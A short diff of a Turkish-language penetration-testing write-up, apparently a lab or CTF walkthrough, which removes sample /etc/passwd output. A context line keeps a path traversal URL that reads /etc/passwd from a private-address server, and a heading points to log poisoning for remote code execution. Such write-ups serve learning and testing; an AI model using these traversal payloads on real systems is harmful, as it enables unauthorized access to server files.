@@ -132,14 +132,6 @@ http://10.114.144.39/?view=dog/../../../../../../../etc/passwd&ext
 
 Ve sistem dosyasının tam içeriğini elde ettim:
 
-```
-Here you go!
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-...
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-```
-
 Artık sunucudaki herhangi bir dosyayı okuyabiliyordum.
 
 ## 5. Log Poisoning ile RCE
